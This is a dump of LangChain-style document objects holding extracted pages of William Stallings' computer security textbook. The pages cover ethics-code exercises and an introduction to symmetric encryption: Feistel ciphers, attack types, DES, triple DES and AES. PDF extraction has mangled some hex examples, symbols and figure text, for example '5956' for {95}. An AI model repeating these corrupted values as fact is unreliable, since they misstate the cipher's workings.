indicate what arguments you might use to \\ndefend your actions. Make reference to the Professional Codes of Conduct shown in \\nFigures 19.6 through 19.8.\\n 19.10 Section 19.4 stated that the thr ee ethical codes illustrated in this chapter (ACM, \\nIEEE, and AITP) share the common themes of dignity and worth of people; personal \\nintegrity; responsibility for work; confidentiality of information; public safety, health, \\nand  welfare; participation in professional societies; and knowledge about technology \\nrelated to social power. Construct a table that shows for each theme and for each code \\nthe relevant clause or clauses in the code that address the theme.\\n 19.11 A copy of the ACM Code of Professional Conduct from 1982 is available at box.com/\\ncompsec4e. Compare this Code with the 1997 ACM Code of Ethics and Professional \\nConduct (see Figure 19.6).\\na. Are there any elements in the 1982 Code not found in the 1997 Code? Propose a \\nrationale for excluding these.\\nb. Are there any elements in the 1997 Code not found in the 1982 Code? Propose a \\nrationale for adding these.\\n 19.12 A copy of the IEEE Code Ethics from 1 979 is available at box.com/compsec4e. \\n Compare this Code with the 2006 IEEE Code of Ethics (see Figure 19.7).\\na. Are there any elements in the 1979 Code not found in the 2006 Code? Propose a \\nrationale for excluding these.\\nb. Are there any elements in the 2006 Code not found in the 1979 Code? Propose a \\nrationale for adding these.\\n 19.13 A copy of the 1 999 Software Engineering Code of Ethics and Professional Practice \\n(Version 5.2) as recommended by an ACM/IEEE-CS Joint Task Force is available at \\nbox.com/compsec3e. Compare this Code each of the three codes reproduced in this \\nchapter (see Figures 19.6 through 19.8). Comment in each case on the differences.\\nM19_STAL0611_04_GE_C19.indd   626 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 628, 'page_label': '627'}, page_content='Symmetric Encryption and \\nMessage Confidentiality\\n CHAPTER \\nPart Four:  Cryptographic \\nAlgorithms\\n \\n20.1 Symmetric Encryption Principles\\nCryptography\\nCryptanalysis\\nFeistel Cipher Structure\\n20.2 Data Encryption Standard\\nData Encryption Standard\\nTriple DES\\n20.3 Advanced Encryption Standard\\nOverview of the Algorithm\\nAlgorithm Details\\n20.4 Stream Ciphers and RC4\\nStream Cipher Structure\\nThe RC4 Algorithm\\n20.5 Cipher Block Modes of Operation\\nElectronic Codebook Mode\\nCipher Block Chaining Mode\\nCipher Feedback Mode\\nCounter Mode\\n20.6 Key Distribution\\n20.7 Key Terms, Review Questions, and Problems\\n627\\nM20_STAL0611_04_GE_C20.indd   627 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 629, 'page_label': '628'}, page_content='628  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nSymmetric encryption, also referred to as conventional encryption, secret-key, or \\n single-key encryption, was the only type of encryption in use prior to the  development \\nof public-key encryption in the late 1970s.1 It remains by far the most widely used of \\nthe two types of encryption.\\nThis chapter begins with a look at a general model for the symmetric  encryption \\nprocess; this will enable us to understand the context within which the algorithms \\nare used. Then, we look at three important block encryption algorithms: DES,  triple \\nDES, and AES. Next, the chapter introduces symmetric stream encryption and \\ndescribes the widely used stream cipher RC4. We then examine the application of \\nthese  algorithms to achieve confidentiality.\\n 20.1 SYMMETRIC ENCRYPTION PRINCIPLES\\nAt this point the reader should review Section 2.1. Recall that a symmetric encryption \\nscheme has five ingredients (see Figure 2.1):\\n• Plaintext: This is the original message or data that is fed into the algorithm as input.\\n• Encryption algorithm: The encryption algorithm performs various substitutions \\nand transformations on the plaintext.\\n• Secret key: The secret key is also input to the algorithm. The exact substitutions \\nand transformations performed by the algorithm depend on the key.\\n• Ciphertext: This is the scrambled message produced as output. It depends on \\nthe plaintext and the secret key. For a given message, two different keys will \\nproduce two different ciphertexts.\\n• Decryption algorithm:  This is essentially the encryption algorithm run in \\nreverse. It takes the ciphertext and the same secret key and produces the \\n original plaintext.\\n1Public-key encryption was first described in the open literature in 1976; the US National Security Agency \\n(NSA) and the (then) UK CESG claim to have discovered it some years earlier.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Explain the basic principles of symmetric encryption.\\n ◆ Understand the significance of the Feistel cipher structure.\\n ◆ Describe the structure and function of DES.\\n ◆ Distinguish between two-key and three-key triple DES.\\n ◆ Describe the structure and function of AES.\\n ◆ Compare and contrast stream encryption and block cipher encryption.\\n ◆ Distinguish among the major block cipher modes of operation.\\n ◆ Discuss the issues involved in key distribution.\\nM20_STAL0611_04_GE_C20.indd   628 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 630, 'page_label': '629'}, page_content='20.1 / SyMMETRiC EnCRyPTion PRinCiPlES  629\\nCryptography\\nCryptographic systems are generically classified along three independent dimensions:\\n1. The type of operations used for transforming plaintext t o ciphertext.  All \\n encryption algorithms are based on two general principles: substitution, in which \\neach element in the plaintext (bit, letter, group of bits or letters) is mapped \\ninto another element, and transposition, in which elements in the plaintext are \\n rearranged. The fundamental requirement is that no information be lost (i.e., \\nthat all operations be reversible). Most systems, referred to as product systems, \\ninvolve multiple stages of substitutions and transpositions.\\n2. The number of keys used. If both sender and receiver use the same key, the  system \\nis referred to as symmetric, single-key, secret-key, or conventional encryption. \\nIf\\xa0the sender and receiver each use a different key, the system is referred to as \\nasymmetric, two-key, or public-key encryption.\\n3. The way in which the plaintext is processed. A block cipher processes the input \\none block of elements at a time, producing an output block for each input block. \\nA stream cipher processes the input elements continuously, producing output \\none element at a time, as it goes along.\\nCryptanalysis\\nThe process of attempting to discover the plaintext or key is known as  cryptanalysis. \\nThe strategy used by the cryptanalyst depends on the nature of the encryption scheme \\nand the information available to the cryptanalyst.\\nTable 20.1 summarizes the various types of cryptanalytic attacks, based on \\nthe amount of information known to the cryptanalyst. The most difficult problem \\nis  presented when all that is available is the ciphertext only. In some cases, not even \\nthe encryption algorithm is known, but in general, we can assume the opponent \\ndoes know the algorithm used for encryption. One possible attack under these \\n circumstances is the brute-force approach of trying all possible keys. If the key space \\nis very large, this becomes impractical. Thus, the opponent must rely on an analysis \\nof the ciphertext itself, generally applying various statistical tests to it. To use this \\napproach, the opponent must have some general idea of the type of plaintext that \\nis concealed, such as English or French text, an EXE file, a Java source listing, an \\naccounting file, and so on.\\nThe ciphertext-only attack is the easiest to defend against because the  opponent \\nhas the least amount of information with which to work.  In many cases, however, \\nthe analyst has more information. The analyst may be able to capture one or more \\nplaintext  messages as well as their encryptions. Or the analyst may know that certain \\nplaintext\\xa0patterns will appear in a message. For example, a file that is encoded in the \\nPostscript format always begins with the same pattern, or there may be a standard -\\nized header or banner to an electronic funds transfer message, and so on. All these \\nare examples of known plaintext. With this knowledge, the analyst may be able to \\ndeduce the key on the basis of the way in which the known plaintext is transformed.\\nClosely related to the known-plaintext attack is what might be referred to as a \\nprobable-word attack. If the opponent is working with the encryption of some gen -\\neral prose message, he or she may have little knowledge of what is in the message. \\nM20_STAL0611_04_GE_C20.indd   629 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 631, 'page_label': '630'}, page_content='630  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nHowever, if the opponent is after some very specific information, then parts of the \\nmessage may be known. For example, if an entire accounting file is being  transmitted, \\nthe opponent may know the placement of certain key words in the header of the file. \\nAs another example, the source code for a program developed by a corporation might \\ninclude a copyright statement in some standardized position.\\nIf the analyst is able somehow to get the source system to insert into the system \\na message chosen by the analyst, then a chosen-plaintext attack is possible. In general, \\nif the analyst is able to choose the messages to encrypt, the analyst may deliberately \\npick patterns that can be expected to reveal the structure of the key.\\nTable 20.1 lists two other types of attack: chosen ciphertext and chosen text. \\nThese are less commonly employed as cryptanalytic techniques but are nevertheless \\npossible avenues of attack.\\nOnly relatively weak algorithms fail to withstand a ciphertext-only attack. \\n Generally, an encryption algorithm is designed to withstand a known-plaintext attack.\\nAn encryption scheme is computationally secure if the ciphertext generated by \\nthe scheme meets one or both of the following criteria:\\n• The cost of breaking the cipher exceeds the value of the encrypted information.\\n• The time r equired to break the cipher exceeds the useful lifetime of the \\ninformation.\\nUnfortunately, it is very difficult to estimate the amount of effort required \\nto cryptanalyze ciphertext successfully. However, assuming there are no inherent \\n mathematical weaknesses in the algorithm, then a brute-force approach is indicated, \\nand here we can make some reasonable estimates about costs and time.\\nType of Attack Known to Cryptanalyst\\nCiphertext only •  Encryption algorithm\\n• Ciphertext to be decoded\\nKnown plaintext • Encryption algorithm\\n• Ciphertext to be decoded\\n• One or more plaintext–ciphertext pairs formed with the secret key\\nChosen plaintext •  Encryption algorithm\\n• Ciphertext to be decoded\\n• Plaintext message chosen by cryptanalyst, together with its corresponding cipher-\\ntext generated with the secret key\\nChosen ciphertext •  Encryption algorithm\\n• Ciphertext to be decoded\\n• Purported ciphertext chosen by cryptanalyst, together with its corresponding \\ndecrypted plaintext generated with the secret key\\nChosen text • Encryption algorithm\\n• Ciphertext to be decoded\\n• Plaintext message chosen by cryptanalyst, together with its corresponding cipher-\\ntext generated with the secret key\\n• Purported ciphertext chosen by cryptanalyst, together with its corresponding \\ndecrypted plaintext generated with the secret key\\nTable 20.1 Types of Attacks on Encrypted Messages\\nM20_STAL0611_04_GE_C20.indd   630 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 632, 'page_label': '631'}, page_content='20.1 / SyMMETRiC EnCRyPTion PRinCiPlES  631\\nA brute-force approach involves trying every possible key until an intelli -\\ngible translation of the ciphertext into plaintext is obtained. On average, half of all \\npossible keys must be tried to achieve success. This type of attack is discussed in \\nSection 2.1.\\nFeistel Cipher Structure\\nMany symmetric block encryption algorithms, including DES, have a structure first \\ndescribed by Horst Feistel of IBM in 1973 [FEIS73] and shown in Figure 20.1. The \\ninputs to the encryption algorithm are a plaintext block of length 2w bits and a key\\xa0K. \\nThe plaintext block is divided into two halves, L0 and R0. The two halves of the data \\npass through n rounds of processing and then combine to produce the ciphertext \\nblock. Each round i has as inputs Li - 1 and Ri- 1, derived from the previous round, \\nas well as a subkey Ki, derived from the overall K. In general, the subkeys Ki are \\ndifferent from K and from each other, and are generated from the key by a subkey \\ngeneration algorithm.\\nAll rounds have the same structure. A substitution is performed on the left half \\nof the data. This is done by applying a round function F to the right half of the data \\nand then taking the exclusive-OR (XOR) of the output of that function and the left \\nhalf of the data. The round function has the same general structure for each round but \\nis parameterized by the round subkey Ki. Following this substitution, a permutation \\nis performed that consists of the interchange of the two halves of the data.\\nThe Feistel structure is a particular example of the more general structure used \\nby all symmetric block ciphers. In general, a symmetric block cipher consists of a \\nsequence of rounds, with each round performing substitutions and permutations \\nconditioned by a secret key value. The exact realization of a symmetric block cipher \\ndepends on the choice of the following parameters and design features:\\n• Block size:  Larger block sizes mean greater security (all other things being \\nequal) but reduced encryption/decryption speed. A block size of 128 bits is a \\nreasonable tradeoff and is nearly universal among recent block cipher designs.\\n• Key size: Larger key size means greater security but may decrease encryption/  \\ndecryption speed. The most common key length in modern algorithms is \\n128\\xa0bits.\\n• Number of rounds:  The essence of a symmetric block cipher is that a single \\nround offers inadequate security but that multiple rounds offer increasing \\n security. A typical size is 16 rounds.\\n• Subkey generation algorithm: Greater complexity in this algorithm should lead \\nto greater difficulty of cryptanalysis.\\n• Round function: Again, greater complexity generally means greater resistance \\nto cryptanalysis.\\nThere are two other considerations in the design of a symmetric block cipher:\\n• Fast software encryption/decryption: In many cases, encryption is embedded \\nin applications or utility functions in such a way as to preclude a hardware \\nimplementation. Accordingly, the speed of execution of the algorithm becomes \\na concern.\\nM20_STAL0611_04_GE_C20.indd   631 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 633, 'page_label': '632'}, page_content='632  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\n• Ease of analysis: Although we would like to make our algorithm as difficult as \\npossible to cryptanalyze, there is great benefit in making the algorithm easy \\nto analyze. That is, if the algorithm can be concisely and clearly explained, it is \\neasier to analyze that algorithm for cryptanalytic vulnerabilities and therefore \\ndevelop a higher level of assurance as to its strength. DES, for example, does \\nnot have an easily analyzed functionality.\\nDecryption with a symmetric block cipher is essentially the same as the encryp-\\ntion process. The rule is as follows: Use the ciphertext as input to the algorithm, \\nbut use the subkeys Ki in reverse order. That is, use Kn in the first round, Kn - 1 in \\nFigure 20.1 Classical Feistel Network\\nPlaintext (2    bits)\\nbits bits\\nRound 1\\nRound i\\nRound n\\nF\\nL0\\nK 1\\nK i\\nK n\\nR 1\\nR 0\\nL1\\nR iLi\\nCiphertext (2    bits)\\nR nLn\\nR n  +  1Ln  +  1\\nF\\nF\\nM20_STAL0611_04_GE_C20.indd   632 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 634, 'page_label': '633'}, page_content='20.2 / dATA EnCRyPTion STAndARd  633\\nthe second round, and so on until K1 is used in the last round. This is a nice feature \\nbecause it means we need not implement two different algorithms, one for encryp -\\ntion and one for decryption.\\n 20.2 DATA ENCRYPTION STANDARD\\nThe most commonly used symmetric encryption algorithms are block ciphers. A\\xa0block \\ncipher processes the plaintext input in fixed-size blocks and produces a block of \\nciphertext of equal size for each plaintext block. This section and the next focus on \\nthe three most important symmetric block ciphers: the Data Encryption Standard \\n(DES), triple DES (3DES), and the Advanced Encryption Standard (AES).\\nData Encryption Standard\\nThe most widely used encryption scheme is based on the Data Encryption  Standard \\n(DES) adopted in 1977 by the National Bureau of Standards, now the National \\n Institute of Standards and Technology (NIST), as FIPS 46 (Data Encryption Standard, \\nJanuary 1977). The algorithm itself is referred to as the Data Encryption Algorithm \\n(DEA).2\\nThe DES algorithm can be described as follows. The plaintext is 64 bits in \\nlength and the key is 56 bits in length; longer plaintext amounts are processed in \\n64-bit blocks. The DES structure is a minor variation of the Feistel network shown \\nin  Figure\\xa0 20.1. There are 16 rounds of processing. From the original 56-bit key,  \\n16\\xa0subkeys are generated, one of which is used for each round.\\nThe process of decryption with DES is essentially the same as the encryption \\nprocess. The rule is as follows: Use the ciphertext as input to the DES algorithm, but \\nuse the subkeys Ki in reverse order. That is, use K16 on the first iteration, K15 on the \\nsecond iteration, and so on until K1 is used on the sixteenth and last iteration.\\nTriple DES\\nTriple DES (3DES) was first standardized for use in financial applications in ANSI \\nstandard X9.17 in 1985. 3DES was incorporated as part of the Data Encryption \\n Standard in 1999, with the publication of FIPS 46-3.\\n3DES uses three keys and three executions of the DES algorithm. The function \\nfollows an encrypt-decrypt-encrypt (EDE) sequence (see Figure 20.2a):\\nC = E(K3, D(K2, E(K1, p)))\\nwhere\\nC = ciphertext\\nP = plaintext\\n2The terminology is a bit confusing. Until recently, the terms DES and DEA could be used interchangeably. \\nHowever, the most recent edition of the DES document includes a specification of the DEA described here \\nplus the triple DEA (3DES) described subsequently. Both DEA and 3DES are part of the Data Encryp-\\ntion Standard. Further, until the recent adoption of the official term 3DES, the triple DEA algorithm was \\ntypically referred to as triple DES and written as 3DES. For the sake of convenience, we will use 3DES.\\nM20_STAL0611_04_GE_C20.indd   633 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 635, 'page_label': '634'}, page_content='634  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nE(K, X) = DES encryption of X using key K\\nD(K, Y) = DES decryption of Y using key K\\nDecryption is simply the same operation with the keys reversed (see Figure \\n20.2b):\\nP = D(K1, E(K2, D(K3, C)))\\nThere is no cryptographic significance to the use of decryption for the  second \\nstage of 3DES encryption. Its only adv antage is that it allows users of 3DES to \\ndecrypt data encrypted by users of the older single DES:\\nC = E(K1, D(K1, E(K1, P))) = E(K, P)\\nWith three distinct keys, 3DES has an effective key length of 168 bits. FIPS 46-3 \\nalso allows for the use of two keys, with K1 = K3; this provides for a key length of \\n112 bits. FIPS 46-3 includes the following guidelines for 3DES:\\n• 3DES is the FIPS approved symmetric encryption algorithm of choice.\\n• The original DES, which uses a single 56-bit key, is permitted under the standard \\nfor legacy systems only. New procurements should support 3DES.\\n• Government organizations with legac y DES systems are encouraged to \\n transition to 3DES.\\n• It is anticipated that 3DES and the Advanced Encryption Standard (AES) will \\ncoexist as FIPS-approved algorithms, allowing for a gradual transition to AES.\\nIt is easy to see that 3DES is a formidable algorithm. Because the underlying \\ncryptographic algorithm is DEA, 3DES can claim the same resistance to cryptanaly-\\nsis based on the algorithm as is claimed for DEA. Further, with a 168-bit key length, \\nbrute-force attacks are effectively impossible.\\nUltimately, AES is intended to replace 3DES, but this process will take a \\n number of years.  NIST anticipates that 3DES will remain an approved algorithm \\n(for U.S. government use) for the foreseeable future.\\nFigure 20.2 Triple DES\\nEP D E CA B\\nK1 K2 K3\\nDC E D PB A\\nK3 K2 K1\\n(a) Encryption\\n(b) Decryption\\nM20_STAL0611_04_GE_C20.indd   634 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 636, 'page_label': '635'}, page_content='20.3 / AdVAnCEd EnCRyPTion STAndARd  635\\n 20.3 ADVANCED ENCRYPTION STANDARD\\nThe Advanced Encryption Standard (AES) was issued as a federal information \\n processing standar d FIPS 197 ( Advanced Encryption Standard , November 2001). \\nIt is intended to replace DES and triple DES with an algorithm that is more secure \\nand efficient.\\nOverview of the Algorithm\\nAES uses a block length of 128 bits and a key length that can be 128, 192, or 256 bits. \\nIn the description of this section, we assume a key length of 128 bits, which is likely \\nto be the one most commonly implemented.\\nFigure 20.3 shows the overall structure of AES. The input to the encryption and \\ndecryption algorithms is a single 128-bit block. In FIPS 197 , this block is depicted as \\na square matrix of bytes. This block is copied into the State array, which is modified \\nat each stage of encryption or decryption. After the final stage, State is copied to an \\noutput matrix. Similarly, the 128-bit key is depicted as a square matrix of bytes. This \\nkey is then expanded into an array of key schedule words; each word is 4 bytes and \\nthe total key schedule is 44 words for the 128-bit key. The ordering of bytes within \\na matrix is by column. So, for example, the first 4 bytes of a 128-bit plaintext input \\nto the encryption cipher occupy the first column of the in matrix, the second 4 bytes \\noccupy the second column, and so on. Similarly, the first 4 bytes of the expanded key, \\nwhich form a word, occupy the first column of the w matrix.\\nThe following comments give some insight into AES:\\n1. One noteworthy feature of this structur e is that it is not a Feistel structure. \\nRecall that in the classic Feistel structure, half of the data block is used to \\nmodify the other half of the data block, then the halves are swapped. AES does \\nnot use a Feistel structure but processes the entire data block in parallel during \\neach round using substitutions and permutation.\\n2. The key that is provided as input is expanded into an array of forty-four 32-bit \\nwords, w[i]. Four distinct words (128 bits) serve as a round key for each round.\\n3. Four different stages are used, one of permutation and three of substitution:\\n• Substitute Bytes: Uses a table, referred to as an S-box,3 to perform a byte-\\nby-byte substitution of the block\\n• Shift Rows: A simple permutation that is performed row by row\\n• Mix Columns: A substitution that alters each byte in a column as a function \\nof all of the bytes in the column\\n• Add Round key: A simple bitwise XOR of the current block with a portion \\nof the expanded key\\n4. The structure is quite simple. For both encryption and decryption, the cipher \\nbegins with an Add Round Key stage, followed by nine rounds that each includes \\n3The term S-box, or substitution box, is commonly used in the description of symmetric ciphers to refer to \\na table used for a table-lookup type of substitution mechanism.\\nM20_STAL0611_04_GE_C20.indd   635 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 637, 'page_label': '636'}, page_content='636  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nall four stages, followed by a tenth round of three stages. Figure 20.4 depicts the \\nstructure of a full encryption round.\\n5. Only the Add Round Key stage makes use of the key. For this reason, the cipher \\nbegins and ends with an Add Round Key stage. Any other stage, applied at the \\nbeginning or end, is reversible without knowledge of the key and so would add \\nno security.\\n6. The Add Round Key stage by itself would not be formidable. The other three \\nstages together scramble the bits, but by themselves would provide no security \\nFigure 20.3 AES Encryption and Decryption\\nAdd Round Key\\nPlaintext\\nSubstitute Bytes Expand Key\\nShift Rows\\nMix Columns\\nRound 1Round 9Round 10\\nAdd Round Key\\nSubstitute Bytes\\nShift Rows\\nMix Columns\\nAdd Round Key\\nSubstitute Bytes\\nShift Rows\\nAdd Round Key\\nCiphertext\\n(a) Encryption\\nKey\\nAdd Round Key\\nPlaintext\\nInverse Sub Bytes\\nInverse Shift Rows\\nInverse Mix Cols\\nRound 10Round 9Round 1\\nAdd Round Key\\nInverse Sub Bytes\\nInverse Shift Rows\\nInverse Mix Cols\\nAdd Round Key\\nInverse Sub Bytes\\nInverse Shift Rows\\nAdd Round Key\\nCiphertext\\n(b) Decryption\\n[0, 3]\\n[4, 7]\\n[36, 39]\\n[40, 43]\\nM20_STAL0611_04_GE_C20.indd   636 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 638, 'page_label': '637'}, page_content='20.3 / AdVAnCEd EnCRyPTion STAndARd  637\\nbecause they do not use the key. We can view the cipher as alternating  operations \\nof XOR encryption (Add Round Key) of a block, followed by scrambling of \\nthe block (the other three stages), followed by XOR encryption, and so on. This \\nscheme is both efficient and highly secure.\\n7. Each stage is eas ily reversible. For the Substitute Byte, Shift Row, and Mix \\n Columns stages, an inverse function is used in the decryption algorithm. For the \\nAdd Round Key stage, the inverse is achieved by XORing the same round key to \\nthe block, using the result that A /uni2295.altA /uni2295.altB = B.\\n8. As with most block ciphers, the decryption algorithm makes use of the expanded \\nkey in reverse order. However, the decryption algorithm is not identical to the \\nencryption algorithm. This is a consequence of the particular structure of AES.\\n9. Once it is established that all four stages are reversible, it is easy to verify that \\ndecryption does recover the plaintext. Figure 20.3 lays out encryption and decryp-\\ntion going in opposite vertical directions. At each horizontal point (e.g., the dashed \\nline in the figure), State is the same for both encryption and decryption.\\n10. The final round of both encryption and decryption consists of only three stages. \\nAgain, this is a consequence of the particular structure of AES and is required \\nto make the cipher reversible.\\nFigure 20.4 AES Encryption Round\\nS S S S S S S S S S S S S S S SSub Bytes\\nState\\nState\\nState\\nState\\nState\\nShift Rows\\nMix Columns\\nAdd Round Key\\nM M M M\\nr0 r1 r2 r3 r4 r5 r6 r7 r8 r9 r10 r11 r12 r13 r14 r15\\nM20_STAL0611_04_GE_C20.indd   637 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 639, 'page_label': '638'}, page_content='638  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nAlgorithm Details\\nWe now look briefly at the principal elements of AES in more detail. A more detailed \\ndescription is given in [STAL17].\\nSubStitute byteS tranSformation The forward substitute byte transformation, \\ncalled SubBytes, is a simple table lookup. AES defines a 16#16 matrix of byte values, \\ncalled an S-box (see Table 20.2a), that contains a permutation of all possible 256 8-bit \\nvalues. Each individual byte of State is mapped into a new byte in the following way: \\nThe leftmost 4 bits of the byte are used as a row value, and the rightmost 4 bits are \\nused as a column value. These row and column values serve as indexes into the S-box \\nto select a unique 8-bit output value. For example, the hexadecimal value4 5956 refer-\\nences row 9, column 5 of the S-box, which contains the value 52A6. Accordingly, the \\nvalue 5956 is mapped into the value 52A6.\\nHere is an example of the SubBytes transformation:\\nThe S-box is constructed using properties of finite fields. The topic of finite \\nfields is beyond the scope of this book; it is discussed in detail in [STAL17].\\nEA 04 65 85\\n83 45 5D 96\\n5C 33 98 B0\\nF0 2D AD C5\\n87 F2 4D 97\\nEC 6E 4C 90\\n4A C3 46 E7\\n8C D8 95 A6\\nThe inverse substitute byte transformation , called InvSubBytes, makes use \\nof the inverse S-box shown in Table 20.2b. Note, for example, that the input 52A6 \\n produces the output 5956, and the input 5956 to the S-box produces 52A6.\\nThe S-box is designed to be resistant to known cryptanalytic attacks. Specifi -\\ncally, the AES developers sought a design that has a low correlation between input \\nbits and output bits and the property that the output cannot be described as a simple \\nmathematical function of the input.\\nShift row tranSformation For the forward shift row transformation , called \\nShiftRows, the first row of State is not altered. For the second row, a 1 -byte circular \\nleft shift is performed. For the third row, a 2-byte circular left shift is performed. For \\nthe third row, a 3-byte circular left shift is performed. The following is an example \\nof ShiftRows:\\n87 F2 4D 97\\nEC 6E 4C 90\\n4A C3 46 E7\\n8C D8 95 A6\\n87 F2 4D 97\\n6E 4C 90 EC\\n46 E7 4A C3\\nA6 8C D8 95\\n4In FIPS 197 , a hexadecimal number is indicated by enclosing it in curly brackets. We use that convention.\\nM20_STAL0611_04_GE_C20.indd   638 10/11/17   3:19 PM'),\n",
